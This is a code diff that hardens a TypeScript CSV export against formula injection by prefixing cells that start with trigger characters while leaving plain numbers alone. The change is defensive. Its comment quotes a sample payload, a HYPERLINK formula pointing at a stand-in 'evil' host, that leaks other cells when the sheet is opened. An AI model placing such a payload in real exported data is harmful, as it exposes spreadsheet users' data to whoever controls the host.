@@ -17,12 +17,30 @@ const ROW_END = '\r\n';
 const BOM = '\uFEFF';
 
 /**
- * Escape a single cell value for CSV. Wraps in double quotes when the value
- * contains the separator, a quote, or a newline. Doubles internal quotes.
+ * Cells that would be read as a FORMULA by Excel / Google Sheets when they begin
+ * with one of these characters (CSV / formula injection). A crafted value like
+ * `=HYPERLINK("http://evil/?"&A1)` in a guest name or description would execute
+ * on open — leaking other cells or, with DDE, running a command.
+ *
+ * `NUMERIC` recognises a plain number (incl. a negative like -12.50) so amount
+ * columns — which legitimately start with `-` — are left untouched. Everything
+ * else that starts with a trigger char is prefixed with a single quote so the
+ * spreadsheet treats the whole cell as text.
+ */
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
+const NUMERIC = /^[+-]?\d+(\.\d+)?$/;
+
+/**
+ * Escape a single cell value for CSV. Neutralizes formula-injection triggers,
+ * then wraps in double quotes when the value contains the separator, a quote, or
+ * a newline. Doubles internal quotes.
  */
 function escapeCell(value: unknown): string {
   if (value === null || value === undefined) return '';
-  const s = typeof value === 'string' ? value : String(value);
+  let s = typeof value === 'string' ? value : String(value);
+  if (FORMULA_TRIGGER.test(s) && !NUMERIC.test(s)) {
+    s = `'${s}`;
+  }
   if (s.includes(SEP) || s.includes('"') || s.includes('\n') || s.includes('\r')) {
     return `"${s.replace(/"/g, '""')}"`;
   }
